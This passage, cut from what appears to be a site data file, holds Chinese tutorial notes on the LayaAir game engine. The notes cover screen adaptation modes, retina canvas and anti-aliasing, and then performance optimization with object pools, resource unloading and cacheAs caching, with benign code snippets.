里使用的分辨率（逻辑像素、css像素），也是“行”乘以“列”的形式。\n不同的软件程序有不同的逻辑像素，例如在web里就是css像素。\n\n\n# 缩放因子\n\n早期一个逻辑像素对应一个物理像素，在后来屏幕显示技术得到提升，同样尺寸屏幕 其物理分辨率是以前的几倍，如果还是一个逻辑像素对应一个物理像素的话，显示出的图片会变小，要让显示的图片大小不变，那么一个逻辑像素要对应多个物理像素，也就是需要一个参数来维持物理分辨率和逻辑分辨率的转换关系，这个参数就是 缩放因子，写法：@2x、@3x ，转换关系： 物理分辨率=逻辑分辨率×缩放因子 。\n\n为什么不同样也提升逻辑分辨率，因为软件显示图片（绘制图片）的api使用的单位是不会随意变化的（因为有些屏幕还是老样子），也就是逻辑分辨率是不会改变的。\n\n\n\n\n# 屏幕适配基本概念\n\n\n# dpr\n\n手机应用常使用 缩放因子 ，对应在浏览器（web页面）里是 设备像素比 (device pixel ratio，简称 dpr )，也就是物理像素与逻辑像素之间的比率；layaair引擎中通过 laya.browser.pixelratio 可以获得浏览器的dpr值。\n\n在浏览器里用户可以按住ctrl然后使用鼠标滚轮来缩放页面（手机是双指扩张），这种并非是由dpr值来决定页面缩放，但在h5游戏中是不允许这样操作的并且还要通过逻辑分辨率来适配（获取当前机型的dpr，决定一个逻辑像素占用几个物理像素），所以要给页面进行一个限制：\n\n通过上面这段viewpot的配置，那页面在禁止用户手动缩放的同时，也会按设备的dpr进行自动缩放。\n\n\n# 物理宽高、逻辑宽高\n\n物理宽高：物理分辨率的宽和高上各有多少个物理像素(px)，也叫设备宽高or屏幕宽高；引擎获取物理宽高laya.browser.width、laya.browser.height\n\n逻辑宽高：逻辑分辨的宽和高上各有多少个逻辑像素(pt)；引擎获取逻辑宽高laya.browser.clientwidth、laya.browser.clientheight\n\n\n\n说明：引擎中的 逻辑宽高 其实是封装了浏览器的 clientwidth和clientheight，然后 物理宽高 是通过 逻辑宽高×dpr 计算出来的；但是像iphone 8 plus这种机型比较特殊，算出来跟实际上的还是有区别的（实际是2.6的比率）。\n\n\n# 设计宽高\n\n设计宽高：开发者在设计产品时采用的宽高，常采用750×1334，也就是iphone6 7 8的物理分辨率\n\n怎么选择设计宽高：\n\n * 设计宽高 采用的是物理分辨率，因为web最基础的像素单位还是物理像素点px；\n * 设计宽高 常选择750×1334，首先要去掉 过时 的机型例如iphone4这种，然后再看 分辨率宽高比，大概分为 1:1.78的非全面屏机 和 1:2.17全面屏机，其他机型也比较接近这两种；其次看 性能，因为像素太多引擎性能会低一些，所以选择1:1.78的；最后去掉了 plus特殊机型，再选择 稍流行 的机型，那就是750×1334了。（目前推荐是750×1334，如果750×1334完全过时了，估计就会选择设计宽高大一点的了）\n\n设置设计宽高的方式：\n\n\n\n# 画布宽高、舞台宽高\n\n画布宽高：画布（<canvas>）是laya引擎绘制的基础，好比是画画的纸；画布有width、heigth两个属性，也就是 画布宽高 。\n\n画布宽高的值对画面最终的 清晰度以及性能 都会产生影响，甚至 边缘锯齿或画面模糊 也与画布宽高值有关。\n在noscale、exactfit、noborder这几个适配模式下 画布宽高会直接采用设计宽高值，而其它适配模式下，会根据适配规则产生变化。\n\n查看画布宽高的方式：\n\n\n舞台宽高：基于laya引擎开发的所有可见元素都是 添加到舞台(stage)上 才能被显示的；舞台是显示列表的 根节点，也是最顶级的父容器；它也有width、heigth两个属性，也就是 舞台宽高 。\n\n舞台宽高的变化 并不会影响到画面显示的大小，但stage范围内，可以控制 显示，可以进行 事件监听，碰撞检测 等。\n像full、fixedwidth、fixedheight、fixedauto这些适配模式可以做到 stage全覆盖。\n\n画布与舞台的关系： 画布处于最底层，舞台一定是在画布内显示的，也就是说画布宽高必须 大于或等于舞台的宽高；\n如果舞台的宽高超出了画布的宽高，即使舞台上有显示内容也会 被裁切掉无法显示。\n\n\n# 抗锯齿\n\n\n# 锯齿产生的原因\n\n图象是像素点按照行与列的矩阵这样的方式展示的，假如基于单个像素点画横着或竖着的直线，可以看到它比较平整，而画斜线或者曲线，会看到它并不平整像锯齿一样；在屏幕适配时难免不会进行缩放操作，这样会使得一些画面模糊也就是锯齿感比较强烈。\n\n\n\n# 引擎内置的抗锯齿\n\ninit()前，设置 config.isantialias=true; 这样就可以把一些边缘的锯齿模糊掉（弱化），在高分辨率的机器上基本就看不到这样的锯齿了，在低分辨率可能还会看到；\n在2d上是默认关闭这个设置的，除非使用了很多矢量图（尽量别用因为性能不好），可以开启这个设置，3d是默认开启的。\n\n\n\n# 抗锯齿失效的原因\n\n3d虽然默认是开启isantialias这样的抗锯齿功能，但有些情况下发现抗锯齿功能没有生效。通常有两个原因：\n\n * camera从unity导出时不小心勾选了hdr，如果不想重新导出camera可以在laya引擎里关闭hdr，如下图\n   \n * 后期处理管线的bloomeffect泛光效果\n   \n\n\n# 如何设置最佳画布\n\n引擎的抗锯齿功能只是通过一些算法，让边缘过渡的更平滑，从而减轻锯齿现象，在一些像素密度比较大的屏幕上，让肉眼难以识别，并非真的让锯齿消失。\n\n在屏幕适配时，总会有机型不满足，所以会拉伸缩放一些ui，这就会导致 锯齿感的加剧，使得开启了抗锯齿功能也无法完全抵消这些锯齿，所以要考虑让画 一直处于物理分辨率的大小（画布 最佳高清状态 ）。\n\n 1. 让画布处于最佳高清有两种方式：\n    \n    * full屏幕适配模式 ，该模式会无视设计宽高的配置，直接采用物理分辨率作为画布宽高；\n    * 使用 视网膜画布模式 ，视网膜画布模式开启后，无论采用什么适配模式，都会强制将画布设置为当前机型的物理分辨率大小。\n\n 2. 如何开启“视网膜画布模式”？有两种设置方式：\n    \n    * 在初始化舞台init()前添加一行配置代码\n    \n    config.useretinalcanvas = true;\n    \n    \n    1\n    \n    * 如果想动态控制视网膜画布模式的开和关，也可以用另一种设置模式，在init()后添加配置代码\n    \n    laya.stage.useretinalcanvas = true;\n    \n    \n    1\n    \n\n 3. 动态控制“视网膜画布模式”的开启和关闭 如果不是在init()的同一帧内使用useretinalcanvas模式配置的，要先修改 scalemode、width、height、alignh、alignv 中任意一个的值，可以触发引擎的 setscreensize 方法，这样才会 让laya.stage.useretinalcanvas的修改生效。\n    \n    if (condition) {\n        laya.stage.useretinalcanvas = false;\n    } else {\n        laya.stage.useretinalcanvas = true;\n    }\n    laya.stage.alignh = "left";\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 4. 开启“视网膜画布模式”的利弊\n    \n    > 理论上讲，开启视网膜画布模式，在超出设计宽高的机型上，会产生更多的性能消耗。因为画布上的像素越多，性能消耗越大。所以很多2d游戏，都会采用相对小一些的分辨率作为游戏设计宽高。\n    > \n    > 但从实际应用来讲，物理宽高所带来的性能压力也并没有那么多风险。要知道，一些小游戏平台是强制要求必须物理分辨率的。因此，layaairide在导出qq，vivo、oppo、支付宝小游戏平台版本的时候，会强行开启视网膜画布模式（useretinalcanvas）。在微信小游戏中，有的适配模式，如果不采用视网膜画布模式，那游戏画面布局效果将会与浏览器中表现不一样。\n    > \n    > 另外，开启视网膜画布模式，除了能解决一些小游戏平台中的问题，以及可以减轻锯齿现象外，其实还可以让适配变的更简单。因为不使用视网膜画布模式，还想避免锯齿现象，移动端只能使用full模式，而full模式除了让画布和舞台采用了物理分辨率之外，并没有作任何适配，所以对于2d ui，全部需要开发者手工适配。\n    > \n    > 所以，建议开启视网膜画布模式，尤其是3d游戏。如果考虑某些机型的性能压力，开发者可以在存在压力的机型，或者有性能压力的功能上，通过逻辑控制，动态开启或关闭视网膜画布模式。\n\n\n# 理解适配基础\n\n\n# 对ui场景的设置\n\nui场景：一个游戏在各种情况下显示的场景（主页大厅、战斗场景），一般使用视图类组件中的scene组件来实现的。\n\n游戏场景肯定是要铺满引擎画布或者舞台的（不铺满会留下黑边或白边等），那就在 创建ui场景时让它的宽高与设计宽高（f9项目设置）保持一致 。\n\n而设计宽高采用750×1334的物理分辨率，对其他不同物理分辨率机型肯定是要适配的，可以通过laya引擎 对画布或舞台 进行 缩放、对齐、旋转 等一系列方式从而达到屏幕的全屏适配。\n\n\n# 缩放画布和舞台\n\n要想占满全屏最基本的策略就是 缩放，对画布或者舞台进行缩放；\n对画布的缩放，会改变整个场景ui中的 所有可见内容的大小，并会导致 画面出现模糊的现象（拉伸式的缩放），所以对画布的缩放一般是将画布设置成 最佳高清状态（视网膜画布模式），这样就不会使画面模糊了；\n而对舞台的缩放不会影响到画面显示大小，但会影响到可绘制区域和事件响应区域；屏幕适配主要考虑的是缩放舞台，因为画布一般都是开启了“视网膜画布模式”。\n\n\n# 最容易理解的适配模式\n\n\n# 默认的不缩放模式noscale\n\n引擎默认的适配模式是“不缩放模式noscale”，该模式不会缩放画布和舞台（ui场景当然也没有缩放），它们仍然是设计宽高的大小750×1334，这种适配模式下的舞台在iphone5这样的机型上会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphonex 11会多出 白色 底边来（屏幕的颜色）。\n\n\n如果使用noscale模式，在iphone x这个机型上屏幕大小是1125×2436，此时画布和舞台没有缩放仍是750×1334，并处于屏幕的左上角，如果需要让画布处于屏幕的正中央，可以在项目设置f9里让“垂直对齐模式”选择middle，“水平对齐模式”选择center，这种就叫做 “画布对齐方式”。\n\n\n# 物理分辨率画布模式full\n\n“物理分辨率画布模式full”也不缩放画布和舞台，但会让这两个始终等于当前机型的物理分辨率大小，也就是说屏幕、画布和舞台始终都一样大；但是ui场景还是按照设计宽高750×1334这样开发的，那么ui场景在iphone5这样的机型上会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphonex 11会多出 黑色 底边来（画布的颜色）。\n\n\n如果使用full模式，可以对舞台里的ui场景进行 相对布局 （这意味着放弃了设计宽高）；将ui场景 由scene改为view（添加widget组件也可），再让ui场景的 left、right、top和bottom设置为0或者合适的数值，这样的话就可以在不同物理分辨的机型上达到 占满全屏 的效果。\n\n注意：noscale模式下开启“视网膜画布模式”，与full模式视觉效果上一样，不同的是noscale模式舞台没有那么大，所以noscale模式 舞台外面的区域无法接受事件，full模式的舞台和画布一样大，事件一直能接受到。\n\n\n# 强行拉伸全屏模式exactfit\n\n“强行拉伸全屏模式exactfit”，对画布和舞台都进行了非等比缩放，显示前画布和舞台还是设计宽高的大小750×1334，只是在显示出来的时候强行拉伸或者挤压至全屏（非等比缩放），在各种机型上都可以，不会留出底边。\n\n\n\n# 移动端推荐的屏幕适配模式\n\n移动端里可以按照宽或者高来对画布舞台进行的等比缩放，不会像exactfit模式一样就是强制非等比的缩放。\n\n\n# 保宽全屏模式fixedwidth\n\n“保宽全屏模式fixedwidth”，首先保证画布和舞台的 宽度不变(750)，然后按照“设备宽/画布宽”算出 比例，再用“设备高/比例”算出画布 最终 高度，让画布和舞台的高度设置成这个值（例如iphone x算出来的是1624，那就得让原先的1334变为1624），在显示时将 最终的画布宽高按照比例缩放，刚好是占满全屏的；但是ui场景还是按照设计宽高750×1334这样开发的，那么ui场景在iphone5这样的机型上的 上下两边 会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphonex 11的 上下两边 会多出 黑色 底边来（画布的颜色，因为画布是加长了再等比缩放的）。\n\n\n在iphone x上使用 fixedwidth 模式：设备宽高是1125×2436，画布和舞台宽 保持750不变，1125/750=1.5，2436/1.5=1624，那么画布和舞台 最终 宽高是 750×1624 （其实ui的高没有跟着变化，但后面会跟着画布等比缩放），显示时按照1.5的比例将画布和舞台缩放至1125×2436，但ui之前还是750×1334，ui跟着画布等比缩放后，在页面上明显会看到上下两边留出黑色底边了，那就需要对ui的上下进行相对布局了。\n\n\n# 保高全屏模式fixedheight\n\n“保高全屏模式fixedheight”，跟fixedwidth原理一样，就是要优先保证高度不变。\n\n\n# 保宽高全屏模式fixedauto\n\n“保宽高全屏模式fixedauto”，其实采用的就是fixedwidth或者fixedheight，有一个选择规则，如果 物理宽高比 小于 设计宽高比 的话采用fixedwidth模式，否则就采用fixedheight，其实就是 永远不会 让ui被裁剪会一直留出 黑边（画布），然后让ui进行相对布局。\n\nfixedxxx模式下留出的黑边怎么解决？\n开发人员要 尽可能 将各种机型在fixedxxx模式下的 最终 的设计宽高（例如750×1624这种数据）计算出来，然后从中选择一个可以 尽可能覆盖所有情况 的宽高，将这个宽高提供给美术让他们设计一个背景图，这个背景图就可以遮住fixedxxx模式多出的 黑边，背景解决了再让ui进行一些适配（比如 相对布局），这样就完成了移动端的适配了。\n如果是纯色的背景直接动态改变它的大小或者用相同颜色的背景进行拼接。\n\n\n# 其他适配模式\n\n\n# 肯定不被裁切的等比缩放模式showall\n\n“肯定不被裁切的等比缩放模式showall”，它会取“设备高/设计高”和“设备宽/设计宽”这两者中的 最小值 作为比例，让画布和舞台的当前宽高也就是750×1334按照这个比例进行等比缩放；缩放后与当前设备宽高比，肯定有一边会留出白边（屏幕），但肯定不会被裁切。\n\n\nshowall模式做不到手机全屏适配，所以通常不会被用到手机适配上， 在pc浏览器运行的横屏页游，可以使用该模式。\nshowall模式由于画布宽高已经进行了缩放改变，本身就是高清的适配模式，所以这种模式无需使用视网膜画布模式（useretinalcanvas），用了之后画布采用了物理分辨率，反而不好。\n\n\n# 肯定不留黑边的等比缩放模式noborder\n\n“肯定不留黑边的等比缩放模式noborder”，它会取“设备高/设计高”和“设备宽/设计宽”这两者中的 最大值 作为比例，让画布和舞台的当前宽高也就是750×1334按照这个比例进行等比缩放；缩放后与当前设备宽高比，肯定有一边会被裁切，但肯定不会留黑边。\n\n\n虽然说该模式，通过相对布局二次适配，也可以让被裁剪的按钮等回归到屏幕内容之中，但二次适配的方式要更加复杂。所以不推荐使用该模式。\n\n\n# 屏幕适配总结\n\n屏幕的适配方案其实可以归结于这几种：不缩放的、非等比缩放的、等比缩放的（缩放前画布改不改变）\n\n\n# 不缩放\n\nnoscale和full对画布和舞台都没有进行缩放，要么是保持原样的(noscale)但是高清屏里会留 巨大的白边（小屏会被裁剪），要么是直接等于设备宽高(full)但是ui场景没有改变会留 巨大的黑边（小屏会被裁剪）。\n留出巨大的白边或者黑边就是因为 ui场景没有跟着 画布和舞台进行缩放，所以适配都 不会使用这两种模式 ，因为还需要自己对ui场景进行大量适配更改。\n\nps：一定要理解full的是直接设置画布的宽高，并 不是缩放 到设备宽高，ui场景 根本就没有变化（单纯改变画布宽高影响不到ui场景，除非是对画布缩放）。\n\n\n# 非等比缩放\n\nexactfit非等比缩放是一种 粗暴 的方式，直接将设计宽高 缩放 至设备宽高，它不会留边但是会 拉伸页面，因为ui也跟着非等比缩放了，画面已经 变形 了，所以适配也 不会使用这种模式（除非跟别的方案搭配使用）。\n\n\n# 等比缩放前不对画布进行变换\n\n在高清屏上，设计宽高和设备宽高是不成等比的，缩放前 不对画布进行处理，直接按照 设备宽高比 进行缩放，缩放后要么留出 白边 要么 被裁剪；具体就分为showall“展示了全部画布但画布还是比屏幕小（留白边了）”、noborder“不会留白边因为画布超过屏幕区域了”，这两种基本也不会用（pc端可以用showall）。\n\n\n# 等比缩放前对画布进行变换\n\n在高清屏上，设计宽高和设备宽高是不成等比的，可以提前将画布宽高比 强制改变成和设备宽高比一样的，后面就可以进行等比缩放了；这样就需要对画布的宽或高进行 增大 或者 减小，具体就分为：fixedwidth“保宽去增大或减小画布高”、fixedheight“保高去增大或减小画布宽”、fixedauto“增大画布其中的一边”。移动端比较适合使用fixedxxx，ui场景占不满画布或者被裁剪，可以使用相对布局解决。\n\nps：这里的“增大”、“减小”是缩放前改变画布大小（ui场景大小没变），“缩放”是通过tansform的matrix对画布舞台进行缩放变换的（ui场景跟着缩放了）。\n\n\n# 另类的fixedauto\n\nfixedauto是“增大画布其中的一边”，那么可不可以使用“减小画布其中的一边”这种方式来处理缩放前的画布呢？ 当然也是可以的，很多游戏采用fixedauto或者这种 另类的fixedauto 来适配的。\n\n另类的fixedauto ：“物理宽高比” 大于 “设计宽高比”的话，采用fixedwidth模式，否则就采用fixedheight。\n\n像fixedauto这些模式的逻辑是 在laya内部实现的，而另类的fixedauto就 需要自己实现 了，在init()前先采用“减小画布其中的一边”来处理画布，让它的 最终的宽高 与设备宽高形成等比的关系，最后再搭配引擎的 exactfit适配模式 就可以进行等比缩放了。\n\n大概实现： 先设置“f9项目设置”里的设计宽高，一般是750×1334\n\nlet desginw = gameconfig.width; // “f9项目设置”里的设计宽高\nlet desginh = gameconfig.height; // “f9项目设置”里的设计宽高\nconst bw = browser.width; // 设备宽高\nconst bh = browser.height; // 设备宽高\nif ((bw / bh) > (desginw / desginh)) {\n  desginh = bh * (desginw / bw); // 等比转换关系\n} else {\n  desginw = bw * (desginh / bh); // 等比转换关系\n}\n// 另类的fixedauto在如果正常流程下，最后ui肯定是被裁剪，那么这里提前算出ui该缩放的值，\n// 最后手动让ui去缩放到这个值，就可以让ui都处于画布内，但是处理完后还是需要对ui进行相对布局（也可以不缩放ui直接相对布局）\nconst uiscale = math.min(desginh / gameconfig.height, desginw / gameconfig.width);\n// 引擎初始化\nlaya.init(gameconfig.width, gameconfig.height, webgl);\n// 引擎使用exactfit适配模式\nlaya.stage.scalemode = \'exactfit\';\n// 后续的onresize里最好也要重新计算一下desginh和desginw对gameconfig进行重新赋值，这是为了pc端\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 刘海屏的适配\n\n使用 browser.clientheight / browser.clientwidth > 2 （逻辑高/逻辑宽）可以识别识别全面屏或刘海屏，然后对一些ui使用 相对布局 去处理\n\n\n# 自动横竖屏\n\n横竖屏官方讲解\n\n\n# 检测手机屏幕状态\n\n使用 laya.browser.height / laya.browser.width > 1 （物理高/物理宽）可以监测手机屏幕状态，大于1是竖屏，小于1是横屏。\n\nlaya.display.stage中有个screenmode属性，有三个值："none"不更改屏幕、"horizontal" 自动横屏、"vertical" ：自动竖屏。\n\n\n# 不更改屏幕none\n\n默认值none或者不设置screenmode属性时，游戏的水平方向一直跟浏览器水平方向保持一致（浏览器旋转游戏跟着旋转）（适合）。\n\n\n# 自动横屏horizontal\n\n如果screenmode属性值设置为horizontal时，无论屏幕方向如何旋转，游戏的水平方向都会与屏幕最短的边始终保持垂直（适合传奇类横屏游戏）。\n\n横屏游戏的输入法：屏幕是竖屏的时候，游戏是横屏的，但输入法是竖屏的那就建议给输入法到顶部的距离做一个 竖屏的背景 ，不做背景也可以给提示。\n\n\n# 自动竖屏vertical\n\n如果screenmode属性值设置为vertical时，无论屏幕方向如何旋转，游戏的水平方向都会与屏幕较长的边始终保持垂直（适合泡泡龙竖屏游戏）。',charsets:{cjk:!0}},{title:"7.屏幕适配与抗锯齿",frontmatter:{title:"7.屏幕适配与抗锯齿"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/7.%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",relativePath:"book-web/LayaBox游戏引擎/7.性能优化.md",key:"v-8a9a8ecc",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/7.%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",headers:[{level:2,title:"性能统计面板",slug:"性能统计面板",normalizedTitle:"性能统计面板",charIndex:11},{level:2,title:"内存优化",slug:"内存优化",normalizedTitle:"内存优化",charIndex:722},{level:3,title:"使用对象池优化",slug:"使用对象池优化",normalizedTitle:"使用对象池优化",charIndex:731},{level:3,title:"使用Handler.create",slug:"使用handler-create",normalizedTitle:"使用handler.create",charIndex:1023},{level:3,title:"内存释放",slug:"内存释放",normalizedTitle:"内存释放",charIndex:1789},{level:3,title:"资源卸载",slug:"资源卸载",normalizedTitle:"资源卸载",charIndex:1958},{level:3,title:"关于滤镜、遮罩",slug:"关于滤镜、遮罩",normalizedTitle:"关于滤镜、遮罩",charIndex:2309},{level:2,title:"渲染优化",slug:"渲染优化",normalizedTitle:"渲染优化",charIndex:2465},{level:3,title:"优化Sprite",slug:"优化sprite",normalizedTitle:"优化sprite",charIndex:2474},{level:3,title:"优化DrawCall",slug:"优化drawcall",normalizedTitle:"优化drawcall",charIndex:2654},{level:3,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:2759},{level:2,title:"CacheAs静态缓存优化",slug:"cacheas静态缓存优化",normalizedTitle:"cacheas静态缓存优化",charIndex:3078},{level:3,title:"什么是CacheAs",slug:"什么是cacheas",normalizedTitle:"什么是cacheas",charIndex:3096},{level:3,title:"CacheAs的几种缓存模式",slug:"cacheas的几种缓存模式",normalizedTitle:"cacheas的几种缓存模式",charIndex:3256},{level:3,title:"测试是否频繁重绘",slug:"测试是否频繁重绘",normalizedTitle:"测试是否频繁重绘",charIndex:3518},{level:3,title:"如何选择缓存模式",slug:"如何选择缓存模式",normalizedTitle:"如何选择缓存模式",charIndex:3715},{level:3,title:"低端机型的配置因素",slug:"低端机型的配置因素",normalizedTitle:"低端机型的配置因素",charIndex:3994},{level:3,title:"什么情况下不能使用cacheAs",slug:"什么情况下不能使用cacheas",normalizedTitle:"什么情况下不能使用cacheas",charIndex:4145},{level:2,title:"减少CPU使用量",slug:"减少cpu使用量",normalizedTitle:"减少cpu使用量",charIndex:4337},{level:3,title:"减少动态属性查找",slug:"减少动态属性查找",normalizedTitle:"减少动态属性查找",charIndex:4350},{level:3,title:"计时器",slug:"计时器",normalizedTitle:"计时器",charIndex:4423},{level:3,title:"对象边界",slug:"对象边界",normalizedTitle:"对象边界",charIndex:4527},{level:3,title:"根据活动状态改变帧频",slug:"根据活动状态改变帧频",normalizedTitle:"根据活动状态改变帧频",charIndex:4781},{level:3,title:"分批加载资源",slug:"分批加载资源",normalizedTitle:"分批加载资源",charIndex:1043},{level:3,title:"使用callLater",slug:"使用calllater",normalizedTitle:"使用calllater",charIndex:5330},{level:3,title:"使用节流器",slug:"使用节流器",normalizedTitle:"使用节流器",charIndex:6005},{level:2,title:"其它优化策略",slug:"其它优化策略",normalizedTitle:"其它优化策略",charIndex:7305}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"性能统计面板 内存优化 使用对象池优化 使用Handler.create 内存释放 资源卸载 关于滤镜、遮罩 渲染优化 优化Sprite 优化DrawCall 其他 CacheAs静态缓存优化 什么是CacheAs CacheAs的几种缓存模式 测试是否频繁重绘 如何选择缓存模式 低端机型的配置因素 什么情况下不能使用cacheAs 减少CPU使用量 减少动态属性查找 计时器 对象边界 根据活动状态改变帧频 分批加载资源 使用callLater 使用节流器 其它优化策略",content:"# 性能优化\n\n\n# 性能统计面板\n\nLaya引擎内置有性能统计面板，可实时检测当前性能。在init()后添加 **Laya.Stat.show(0,0);**代码即可以性能统计面板（参数是位置）。\n\n\n * FPS：每秒传输帧数(Frames Per Second)，有FPS(Canvas)和FPS(WebGL)两种显示，第一个值是 FPS帧速，越高越好，第二个值是 每帧渲染所消耗的时间（毫秒），越小越好；这两个值如果不能维持在满帧，一般是正在操作页面。\n * Sprite：统计 所有渲染节点（包括容器）数量，反映了 引擎节点遍历、数据组织和渲染的次数 。数字 越低越好，在UI设计时尽可能减少不必要的节点以及嵌套。\n * DrawCall：Canvas模式下表示 每帧的绘制次数，包括图片、文字、矢量图；WebGL模式下表示 渲染提交批次，每次准备数据并通知GPU渲染绘制的过程称为1次DrawCall，在每1次DrawCall中除了在通知GPU的渲染上比较耗时之外，切换材质与shader也是非常耗时的操作。DrawCall是 越少越好，建议开发者尽量限制在100之下。\n * CurMem：WebGL模式下表示 内存与显存的占用；Canvas模式下（没显存概念）表示 内存的占用情况。值越低越好。\n * Shader：WebGL模式独有的性能指标，表示 每帧Shader提交次数，值越低越好。\n * Canvas：只有设置CacheAs后，Canvas才会有值，否则默认为0/0/0。从左至右数值的意义分别为：每帧重绘的画布数量 / 缓存类型为“normal”类型的画布数量 / 缓存类型为“bitmap”类型的画布数量\n\n\n# 内存优化\n\n\n# 使用对象池优化\n\n游戏中某类的对象 不停创建和移除，可以使用 对象池 让对象复用，这样可以减少 新内存的分配 还有 垃圾回收器运行的机会（垃圾回收时也耗内存）。\n\n// 参数1是这类对象的标识符，参数2是类；返回一个对象（没有就新建这一类的对象池，有就从对象池里取）\nLaya.Pool.getItemByClass('img', Laya.Image);\n// 参数1是这类对象的标识符，回收的对象\nLaya.Pool.recover('img', img1);\n\n\n1\n2\n3\n4\n\n\n如果自己实现一个对象池呢？可以使用 Map，key使用类名，value就是对象数组。\n\n\n# 使用Handler.create\n\n\n\n分批加载资源，第一批资源加载完成，触发Laya.Handler.create()创建的complete事件回调方法后 被对象池回收；需要加载第二批资源时，Laya.Handler.create()会首先 在对象池中检索相同的 回调方法处理器，这样节省了内存开销。\n\nLaya.loader.load(urls, Laya.Handler.create(this, this.onAssetLoaded));\n\n\n1\n\n\n但是如果要显示加载资源的进度这个时候需要格外注意，可能会这样写（只会显示一次加载进度）：\n\nLaya.loader.load(urls, Laya.Handler.create(this, this.onAssetLoaded), Laya.Handler.create(this, this.onLoading));\n\n\n1\n\n\n因为要持续显示加载进度，但是Handler.create 默认执行一次就会收到对象（只会显示一次加载进度），那么就需要 关闭 Handler.create的 对象池回收：\n\nLaya.loader.load(urls, Laya.Handler.create(this,this.onAssetLoaded), Laya.Handler.create(this,this.onLoading, null, false));\n\n// 或者使用Handler的实例，它的实例里是没有对象回收池\nLaya.loader.load(urls, Laya.Handler.create(this,this.onAssetLoaded), new Laya.Handler(this, this.onLoading));\n\n\n1\n2\n3\n4\n\n\n\n# 内存释放\n\n垃圾回收前，要确保对象所有的引用都被删除了：\n\n//创建一个Sprite实例\nvar sp:Laya.Sprite = new Laya.Sprite();\n//将sp内部引用设置为null\nsp.destroy();\n\n\n1\n2\n3\n4\n\n\njs垃圾回收机制只有在 内存足够低 时才运行，或者 内存分配 也会触发。\n\n\n# 资源卸载\n\n游戏会分批加载资源，有些资源就用那么一次后面就不会再用了，那么可以在使用后对其进行 资源卸载\n\nconst assets: Array<any> = [];\nassets.push(\"res/apes/monkey0.png\");\nassets.push(\"res/apes/monkey1.png\");\nfor (let i = 0; i < assets.length; i ++) {\n    //查看log，清理前资源一直在内存中\n    console.log(Laya.loader.getRes(assets[i]));\n    //调用清理方法\n    Laya.loader.clearRes(assets[i]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 关于滤镜、遮罩\n\n如果不是动态使用滤镜、遮罩等，可以直接使用 PS 等工具制作图片的 滤镜、遮罩效果； 但是如果要在引擎中 动态使用滤镜、遮罩，这样很耗性能，因为它再引擎中会创建两个位图，一个用于原图的栅格化版本，一个用于生成滤镜或遮罩版本，在动态改变时两个位图会重新创建，占用内存也占用CPU的计算。\n\n\n# 渲染优化\n\n\n# 优化Sprite\n\n 1. 减少不必要的sprite和层次嵌套；\n 2. 非可见区域对象尽量移除或设置visible=false；\n 3. 可以考虑使用panel，因为panel可视区域外的直接子节点不会进行渲染；\n 4. 尽量让 动态内容和静态内容 分开，容器内静态内容不会经常变化，可以对容器设置cacheAs属性来优化节点数或DrawCall。\n\n\n# 优化DrawCall\n\n 1. 尽量保证同图集的图片渲染顺序是挨着的，如果不同图集交叉渲染，会增加DrawCall数量；\n 2. 尽量保证同一个面板中的所有资源用一个图集，这样能减少DrawCall。\n\n\n# 其他\n\n 1. 描边的文本会比没有描边的多调用一次绘图指令，动态的描边文本并且总字符少的可以使用“切片组件”，静态的可以使用cacheAs降低性能消耗；\n\n 2. 文本始终只有一行，并且样式始终不变的，在内容改变时可以使用Text.changeText\n    \n    this.text.text=\"text\";\n     Laya.stage.addChild(this.text);\n     //后面只是更新文字内容，使用changeText能提高性能\n     this.text.changeText(\"text changed.\");\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# CacheAs静态缓存优化\n\n\n# 什么是CacheAs\n\n设置CacheAs可以将显示对象 缓存为静态图像，当子对象发生变化时会自动重新缓存；\n建议把 不经常变化的复杂内容 设置CacheAs，能极大提高渲染性能；\n设置cacheAs后，还可以设置staticCache=true以阻止自动更新缓存，同时可以手动调用reCache方法更新缓存。\n\n\n# CacheAs的几种缓存模式\n\n * “none”时，不做任何缓存。\n * “normal”时，Canvas下进行画布缓存，webgl模式下进行命令缓存；该模式性能优化中等，它能减少每帧渲染的节点数，但不会减少DrawCall数和Shader数。\n * “bitmap”时，Canvas下进行依然是画布缓存，webGL模式下使用renderTarget缓存；renderTarget缓存模式有2048大小限制，超出2048会额外增加内存开销；另外，不断重绘时开销也比较大，但是会减少drawcall，渲染性能最高。\n\n\n# 测试是否频繁重绘\n\nLaya提供的DebugPanel调试工具可以查看游戏重绘区，使用时在代码里增加 DebugPanel.init();。\n\n观察UI是否频繁重绘\n\n勾选 “显示当前cache重绘” 选项或 “显示所有重绘区域” 选项，如果UI进行重绘了，重绘区域会显示出绿色框线，绿色框的左上角显示了重绘次数与重绘时间，性能统计工具的Sprite、DrawCall等也会发生改变。\n\n\n# 如何选择缓存模式\n\nCPU方面：假如开启了DebugPanel调试工具，如果 绿色线框频繁出现，说明UI在频繁的重绘，那么 最好不要 用bitmap模式，normal模式 可以酌情考虑。因为缓存位图时子对象一旦发生改变，那么引擎会自动重新缓存位图，缓存位图的过程会消耗CPU。\n\n可以把UI进行 分层管理，频繁更新的为一层（不使用cacheAs），不频繁更新的为一层（使用cacheAs），这种方法也能提高性能。\n\n内存方面：bitmap模式会比normal模式 多占用一些内存，但只要UI的宽高不是很大，bitmap模式多占用的内存 也不会太大。\n\n\n# 低端机型的配置因素\n\n对于一些低端机来说，CPU与内存不高，如果为了提高渲染性能使用了cacheAs，有可能就会出现问题。如果还是选择适应更多的低端机型，那就需要反复去测试，是否使用cacheAs，还要对比normal与bitmap模式哪种更适合，在优化性能的情况下尽量减少CPU和内存损耗。\n\n\n# 什么情况下不能使用cacheAs\n\n 1. 当对象 